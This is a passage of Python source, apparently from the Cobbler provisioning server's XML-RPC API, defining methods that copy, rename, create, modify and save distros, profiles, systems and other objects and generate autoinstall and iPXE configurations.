object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"distro\", object_id, newname, token)\n\n    def copy_profile(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a profile and renames it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"profile\", object_id, newname, token)\n\n    def copy_system(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a system and renames it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"system\", object_id, newname, token)\n\n    def copy_repo(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a repository and renames it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"repo\", object_id, newname, token)\n\n    def copy_image(self, object_id, newname, token=None):\n        \"\"\"\n        Copies an image and renames it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"image\", object_id, newname, token)\n\n    def copy_mgmtclass(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a management class and rename it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"mgmtclass\", object_id, newname, token)\n\n    def copy_package(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a package and rename it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"package\", object_id, newname, token)\n\n    def copy_file(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a file and rename it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"file\", object_id, newname, token)\n\n    def copy_menu(self, object_id, newname, token=None):\n        \"\"\"\n        Copies a menu and rename it afterwards.\n\n        :param object_id: The object id of the item in question.\n        :param newname: The new name for the copied object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.copy_item(\"menu\", object_id, newname, token)\n\n    def rename_item(self, what, object_id, newname, token=None):\n        \"\"\"\n        Renames an object specified by object_id to a new name.\n\n        :param what: The type of object which shall be renamed to a new name.\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        self._log(\"rename_item(%s)\" % what, object_id=object_id, token=token)\n        obj = self.__get_object(object_id)\n        self.api.rename_item(what, obj, newname)\n        return True\n\n    def rename_distro(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a distribution specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"distro\", object_id, newname, token)\n\n    def rename_profile(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a profile specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"profile\", object_id, newname, token)\n\n    def rename_system(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a system specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"system\", object_id, newname, token)\n\n    def rename_repo(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a repository specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"repo\", object_id, newname, token)\n\n    def rename_image(self, object_id, newname, token=None):\n        \"\"\"\n        Renames an image specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"image\", object_id, newname, token)\n\n    def rename_mgmtclass(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a managementclass specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"mgmtclass\", object_id, newname, token)\n\n    def rename_package(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a package specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"package\", object_id, newname, token)\n\n    def rename_file(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a file specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"file\", object_id, newname, token)\n\n    def rename_menu(self, object_id, newname, token=None):\n        \"\"\"\n        Renames a menu specified by object_id to a new name.\n\n        :param object_id: The id which refers to the object.\n        :param newname: The new name for the object.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.rename_item(\"menu\", object_id, newname, token)\n\n    def new_item(self, what, token, is_subobject: bool = False):\n        \"\"\"Creates a new (unconfigured) object, returning an object handle that can be used.\n\n        Creates a new (unconfigured) object, returning an object handle that can be used with ``modify_*`` methods and\n        then finally ``save_*`` methods. The handle only exists in memory until saved.\n\n        :param what: specifies the type of object: ``distro``, ``profile``, ``system``, ``repo``, ``image``\n                                                   ``mgmtclass``, ``package``, ``file`` or ``menu``\n        :param token: The API-token obtained via the login() method.\n        :param is_subobject: If the object is a subobject of an already existing object or not.\n        :return: The object id for the newly created object.\n        \"\"\"\n        self._log(\"new_item(%s)\" % what, token=token)\n        self.check_access(token, \"new_%s\" % what)\n        if what == \"distro\":\n            d = distro.Distro(self.api, is_subobject=is_subobject)\n        elif what == \"profile\":\n            d = profile.Profile(self.api, is_subobject=is_subobject)\n        elif what == \"system\":\n            d = system.System(self.api, is_subobject=is_subobject)\n        elif what == \"repo\":\n            d = repo.Repo(self.api, is_subobject=is_subobject)\n        elif what == \"image\":\n            d = image.Image(self.api, is_subobject=is_subobject)\n        elif what == \"mgmtclass\":\n            d = mgmtclass.Mgmtclass(self.api, is_subobject=is_subobject)\n        elif what == \"package\":\n            d = package.Package(self.api, is_subobject=is_subobject)\n        elif what == \"file\":\n            d = file.File(self.api, is_subobject=is_subobject)\n        elif what == \"menu\":\n            d = menu.Menu(self.api, is_subobject=is_subobject)\n        else:\n            raise CX(\"internal error, collection name is \\\"%s\\\"\" % what)\n        key = \"___NEW___%s::%s\" % (what, self.__get_random(25))\n        self.object_cache[key] = (time.time(), d)\n        return key\n\n    def new_distro(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"distro\", token)\n\n    def new_profile(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"profile\", token)\n\n    def new_subprofile(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"profile\", token, is_subobject=True)\n\n    def new_system(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"system\", token)\n\n    def new_repo(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"repo\", token)\n\n    def new_image(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"image\", token)\n\n    def new_mgmtclass(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"mgmtclass\", token)\n\n    def new_package(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"package\", token)\n\n    def new_file(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"file\", token)\n\n    def new_menu(self, token: str):\n        \"\"\"\n        See ``new_item()``.\n\n        :param token: The API-token obtained via the login() method.\n        :return: The object id for the newly created object.\n        \"\"\"\n        return self.new_item(\"menu\", token)\n\n    def modify_item(self, what, object_id, attribute, arg, token: str) -> bool:\n        \"\"\"\n        Adjusts the value of a given field, specified by 'what' on a given object id. Allows modification of certain\n        attributes on newly created or existing distro object handle.\n\n        :param what: The type of object to modify.1\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        self._log(\"modify_item(%s)\" % what, object_id=object_id, attribute=attribute, token=token)\n        obj = self.__get_object(object_id)\n        self.check_access(token, \"modify_%s\" % what, obj, attribute)\n\n        if hasattr(obj, attribute):\n            setattr(obj, attribute, arg)\n            return True\n        return False\n\n    def modify_distro(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a distribution.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"distro\", object_id, attribute, arg, token)\n\n    def modify_profile(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a profile.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"profile\", object_id, attribute, arg, token)\n\n    def modify_system(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a system.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"system\", object_id, attribute, arg, token)\n\n    def modify_image(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of an image.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"image\", object_id, attribute, arg, token)\n\n    def modify_repo(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a repository.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"repo\", object_id, attribute, arg, token)\n\n    def modify_mgmtclass(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a managementclass.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"mgmtclass\", object_id, attribute, arg, token)\n\n    def modify_package(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a package.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"package\", object_id, attribute, arg, token)\n\n    def modify_file(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a file.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"file\", object_id, attribute, arg, token)\n\n    def modify_menu(self, object_id, attribute, arg, token: str):\n        \"\"\"\n        Modify a single attribute of a menu.\n\n        :param object_id: The id of the object which shall be modified.\n        :param attribute: The attribute name which shall be edited.\n        :param arg: The new value for the argument.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action was successful. Otherwise False.\n        \"\"\"\n        return self.modify_item(\"menu\", object_id, attribute, arg, token)\n\n    def modify_setting(self, setting_name: str, value, token: str) -> int:\n        \"\"\"\n        Modify a single attribute of a setting.\n\n        :param setting_name: The name of the setting which shall be adjusted.\n        :param value: The new value for the setting.\n        :param token: The API-token obtained via the login() method.\n        :return: 0 on success, 1 on error.\n        \"\"\"\n        if not self.api.settings().allow_dynamic_settings:\n            self._log(\"modify_setting - feature turned off but was tried to be accessed\", token=token)\n            return 1\n        self._log(\"modify_setting(%s)\" % setting_name, token=token)\n        if not hasattr(self.api.settings(), setting_name):\n            self.logger.warning(\"Setting did not exist!\")\n            return 1\n        self.check_access(token, \"modify_setting\")\n        self._log(\"modify_setting(%s)\" % setting_name, token=token)\n        try:\n            if isinstance(getattr(self.api.settings(), setting_name), str):\n                value = str(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), int):\n                value = int(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), bool):\n                value = utils.input_boolean(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), float):\n                value = float(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), list):\n                value = utils.input_string_or_list(value)\n            elif isinstance(getattr(self.api.settings(), setting_name), dict):\n                value = utils.input_string_or_dict(value)[1]\n            else:\n                self.logger.error(\"modify_setting(%s) - Wrong type for value\", setting_name)\n                return 1\n        except TypeError:\n            return 1\n        except ValueError:\n            return 1\n\n        setattr(self.api.settings(), setting_name, value)\n        self.api.settings().save()\n        return 0\n\n    def auto_add_repos(self, token: str):\n        \"\"\"\n        :param token: The API-token obtained via the login() method.\n        \"\"\"\n        self.check_access(token, \"new_repo\", token)\n        self.api.auto_add_repos()\n        return True\n\n    def __is_interface_field(self, field_name: str) -> bool:\n        \"\"\"\n        Checks if the field in ``f`` is related to a network interface.\n\n        :param field_name: The fieldname to check.\n        :return: True if the fields is related to a network interface, otherwise False.\n        \"\"\"\n        # FIXME: This is not tested and I believe prone to errors. Needs explicit testing.\n        if field_name in (\"delete_interface\", \"rename_interface\"):\n            return True\n\n        interface = system.NetworkInterface(self.api)\n        fields = []\n        for attribute in interface.__dict__.keys():\n            if attribute.startswith(\"_\") and (\"api\" not in attribute or \"logger\" in attribute):\n                fields.append(attribute[1:])\n\n        return field_name in fields\n\n    def xapi_object_edit(self, object_type: str, object_name: str, edit_type: str, attributes: dict, token: str):\n        \"\"\"Extended API: New style object manipulations, 2.0 and later.\n\n        Extended API: New style object manipulations, 2.0 and later preferred over using ``new_*``, ``modify_*```,\n        ``save_*`` directly. Though we must preserve the old ways for backwards compatibility these cause much less\n        XMLRPC traffic.\n\n        Ex: xapi_object_edit(\"distro\",\"el5\",\"add\",{\"kernel\":\"/tmp/foo\",\"initrd\":\"/tmp/foo\"},token)\n\n        :param object_type: The object type which corresponds to the collection type the object is in.\n        :param object_name: The name of the object under question.\n        :param edit_type: One of 'add', 'rename', 'copy', 'remove'\n        :param attributes: The attributes which shall be edited. This should be JSON-style string.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the action succeeded.\n        \"\"\"\n        self.check_access(token, \"xedit_%s\" % object_type, token)\n\n        if object_name.strip() == \"\":\n            raise ValueError(\"xapi_object_edit() called without an object name\")\n\n        handle = \"\"\n        if edit_type in (\"add\", \"rename\"):\n            if edit_type == \"rename\":\n                tmp_name = attributes[\"newname\"]\n            else:\n                tmp_name = object_name\n            try:\n                handle = self.get_item_handle(object_type, tmp_name)\n            except CX:\n                pass\n            if handle:\n                raise CX(\"It seems unwise to overwrite the object %s, try 'edit'\", tmp_name)\n\n        if edit_type == \"add\":\n            is_subobject = object_type == \"profile\" and \"parent\" in attributes\n            if is_subobject and \"distro\" in attributes:\n                raise ValueError(\"You can't change both 'parent' and 'distro'\")\n            if object_type == \"system\":\n                if \"profile\" not in attributes and \"image\" not in attributes:\n                    raise ValueError(\"You must specify a 'profile' or 'image' for new systems\")\n            handle = self.new_item(object_type, token, is_subobject=is_subobject)\n        else:\n            handle = self.get_item_handle(object_type, object_name)\n\n        if edit_type == \"rename\":\n            self.rename_item(object_type, handle, attributes[\"newname\"], token)\n            handle = self.get_item_handle(object_type, attributes[\"newname\"], token)\n\n        if edit_type == \"copy\":\n            is_subobject = object_type == \"profile\" and \"parent\" in attributes\n            if is_subobject:\n                if \"distro\" in attributes:\n                    raise ValueError(\"You can't change both 'parent' and 'distro'\")\n                self.copy_item(object_type, handle, attributes[\"newname\"], token)\n                handle = self.get_item_handle(\"profile\", attributes[\"newname\"], token)\n                self.modify_item(\"profile\", handle, \"parent\", attributes[\"parent\"], token)\n            else:\n                self.copy_item(object_type, handle, attributes[\"newname\"], token)\n                handle = self.get_item_handle(object_type, attributes[\"newname\"], token)\n\n        if edit_type in [\"copy\", \"rename\"]:\n            del attributes[\"name\"]\n            del attributes[\"newname\"]\n\n        if edit_type != \"remove\":\n            # FIXME: this doesn't know about interfaces yet!\n            # if object type is system and fields add to dict and then modify when done, rather than now.\n            imods = {}\n            # FIXME: needs to know about how to delete interfaces too!\n            priority_attributes = [\"name\", \"parent\", \"distro\", \"profile\", \"image\"]\n            for attr_name in priority_attributes:\n                if attr_name in attributes:\n                    self.modify_item(object_type, handle, attr_name, attributes.pop(attr_name), token)\n            for (key, value) in list(attributes.items()):\n                if object_type != \"system\" or not self.__is_interface_field(key):\n                    # in place modifications allow for adding a key/value pair while keeping other k/v pairs intact.\n                    if key in [\"autoinstall_meta\", \"kernel_options\", \"kernel_options_post\", \"template_files\",\n                               \"boot_files\", \"fetchable_files\", \"params\"] \\\n                            and attributes.get(\"in_place\"):\n                        details = self.get_item(object_type, object_name)\n                        v2 = details[key]\n                        (ok, parsed_input) = utils.input_string_or_dict(value)\n                        for (a, b) in list(parsed_input.items()):\n                            if a.startswith(\"~\") and len(a) > 1:\n                                del v2[a[1:]]\n                            else:\n                                v2[a] = b\n                        value = v2\n\n                    self.modify_item(object_type, handle, key, value, token)\n\n                else:\n                    modkey = \"%s-%s\" % (key, attributes.get(\"interface\", \"\"))\n                    imods[modkey] = value\n\n            if object_type == \"system\":\n                # FIXME: Don't call this tree if we are not doing any interface stuff.\n                self.__interface_edits(handle, attributes, object_name)\n        else:\n            # remove item\n            recursive = attributes.get(\"recursive\", False)\n            if object_type in [\"profile\", \"menu\"] and recursive is False:\n                childs = len(self.api.find_items(object_type, criteria={'parent': attributes['name']}))\n                if childs > 0:\n                    raise CX(\"Can't delete this %s there are %s sub%ss and 'recursive' is set to 'False'\" %\n                             (object_type, childs, object_type))\n\n            self.remove_item(object_type, object_name, token, recursive=recursive)\n            return True\n\n        # FIXME: use the bypass flag or not?\n        self.save_item(object_type, handle, token)\n        return True\n\n    def __interface_edits(self, handle, attributes, object_name):\n        if \"delete_interface\" not in attributes and \"rename_interface\" not in attributes:\n            # This if is taking care of interface logic. The interfaces are a dict, thus when we get the obj via\n            # the api we get references to the original interfaces dict. Thus this trick saves us the pain of\n            # writing the modified obj back to the collection. Always remember that dicts are mutable.\n            system_to_edit = self.__get_object(handle)\n            if system_to_edit is None:\n                raise ValueError(\"No system found with the specified name (name given: \\\"%s\\\")!\" % object_name)\n            # If we don't have an explicit interface name use the default interface\n            interface_name = attributes.get(\"interface\", \"default\")\n            self.logger.debug(\"Interface \\\"%s\\\" is being edited.\", interface_name)\n            interface = system_to_edit.interfaces.get(interface_name)\n            if interface is None:\n                # If the interface is not existing, create a new one.\n                interface = system.NetworkInterface(self.api)\n            for attribute_key in attributes:\n                if self.__is_interface_field(attribute_key):\n                    if hasattr(interface, attribute_key):\n                        setattr(interface, attribute_key, attributes[attribute_key])\n                    else:\n                        self.logger.warning(\"Network interface field \\\"%s\\\" could not be set. Skipping it.\",\n                                            attribute_key)\n                else:\n                    self.logger.debug(\"Field %s was not an interface field.\", attribute_key)\n            system_to_edit.interfaces.update({interface_name: interface})\n        elif \"delete_interface\" in attributes:\n            if attributes.get(\"interface\") is None:\n                raise ValueError(\"Interface is required for deletion.\")\n            system_to_edit = self.__get_object(handle)\n            system_to_edit.delete_interface(attributes.get(\"interface\"))\n        elif \"rename_interface\" in attributes:\n            system_to_edit = self.__get_object(handle)\n            system_to_edit.rename_interface(attributes.get(\"interface\", \"\"),\n                                            attributes.get(\"rename_interface\", \"\"))\n\n    def save_item(self, what, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param what: The type of object which shall be saved. This corresponds to the collections.\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        self._log(\"save_item(%s)\" % what, object_id=object_id, token=token)\n        obj = self.__get_object(object_id)\n        self.check_access(token, \"save_%s\" % what, obj)\n        if editmode == \"new\":\n            self.api.add_item(what, obj, check_for_duplicate_names=True)\n        else:\n            self.api.add_item(what, obj)\n        return True\n\n    def save_distro(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"distro\", object_id, token, editmode=editmode)\n\n    def save_profile(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"profile\", object_id, token, editmode=editmode)\n\n    def save_system(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"system\", object_id, token, editmode=editmode)\n\n    def save_image(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"image\", object_id, token, editmode=editmode)\n\n    def save_repo(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"repo\", object_id, token, editmode=editmode)\n\n    def save_mgmtclass(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"mgmtclass\", object_id, token, editmode=editmode)\n\n    def save_package(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"package\", object_id, token, editmode=editmode)\n\n    def save_file(self, object_id, token, editmode: str = \"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"file\", object_id, token, editmode=editmode)\n\n    def save_menu(self, object_id, token, editmode=\"bypass\"):\n        \"\"\"\n        Saves a newly created or modified object to disk. Calling save is required for any changes to persist.\n\n        :param object_id: The id of the object to save.\n        :param token: The API-token obtained via the login() method.\n        :param editmode: The mode which shall be used to persist the changes. Currently \"new\" and \"bypass\" are\n                         supported.\n        :return: True if the action succeeded.\n        \"\"\"\n        return self.save_item(\"menu\", object_id, token, editmode=editmode)\n\n    def get_autoinstall_templates(self, token=None, **rest):\n        \"\"\"\n        Returns all of the automatic OS installation templates that are in use by the system.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: A list with all templates.\n        \"\"\"\n        self._log(\"get_autoinstall_templates\", token=token)\n        # self.check_access(token, \"get_autoinstall_templates\")\n        return self.autoinstall_mgr.get_autoinstall_templates()\n\n    def get_autoinstall_snippets(self, token=None, **rest):\n        \"\"\"\n        Returns all the automatic OS installation templates' snippets.\n\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: A list with all snippets.\n        \"\"\"\n\n        self._log(\"get_autoinstall_snippets\", token=token)\n        return self.autoinstall_mgr.get_autoinstall_snippets()\n\n    def is_autoinstall_in_use(self, ai, token=None, **rest):\n        \"\"\"\n        Check if the autoinstall for a system is in use.\n\n        :param ai: The name of the system which could potentially be in autoinstall mode.\n        :param token: The API-token obtained via the login() method.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: True if this is the case, otherwise False.\n        \"\"\"\n        self._log(\"is_autoinstall_in_use\", token=token)\n        return self.autoinstall_mgr.is_autoinstall_in_use(ai)\n\n    def generate_autoinstall(self, profile=None, system=None, REMOTE_ADDR=None, REMOTE_MAC=None, **rest):\n        \"\"\"\n        Generate the autoinstallation file and return it.\n\n        :param profile: The profile to generate the file for.\n        :param system: The system to generate the file for.\n        :param REMOTE_ADDR: This is dropped in this method since it is not needed here.\n        :param REMOTE_MAC: This is dropped in this method since it is not needed here.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The str representation of the file.\n        \"\"\"\n        # ToDo: Remove unneed params: REMOTE_ADDR, REMOTE_MAC, rest\n        self._log(\"generate_autoinstall\")\n        try:\n            return self.autoinstall_mgr.generate_autoinstall(profile, system)\n        except Exception:\n            utils.log_exc()\n            return \"# This automatic OS installation file had errors that prevented it from being rendered \" \\\n                   \"correctly.\\n# The cobbler.log should have information relating to this failure.\"\n\n    def generate_profile_autoinstall(self, profile):\n        \"\"\"\n        Generate a profile autoinstallation.\n\n        :param profile: The profile to generate the file for.\n        :return: The str representation of the file.\n        \"\"\"\n        return self.generate_autoinstall(profile=profile)\n\n    def generate_system_autoinstall(self, system):\n        \"\"\"\n        Generate a system autoinstallation.\n\n        :param system: The system to generate the file for.\n        :return: The str representation of the file.\n        \"\"\"\n        return self.generate_autoinstall(system=system)\n\n    def generate_ipxe(self, profile=None, image=None, system=None, **rest) -> str:\n        \"\"\"\n        Generate the ipxe configuration.\n\n        :param profile: The profile to generate iPXE config for.\n        :param image: The image to generate iPXE config for.\n        :param system: The system to generate iPXE config for.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The configuration as a str representation.\n        \"\"\"\n        self._log(\"generate_ipxe\")\n        return self.api.generate_ipxe(profile, image, system)\n\n    def generate_bootcfg(self, profile: str = None, system: str = None, **rest) -> str:\n        \"\"\"\n        This generates the bootcfg for a system which is related to a certain profile.\n\n        :param profile: The profile which is associated to the system.\n        :param system: The system which the bootcfg should be generated for.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The generated bootcfg.\n        \"\"\"\n        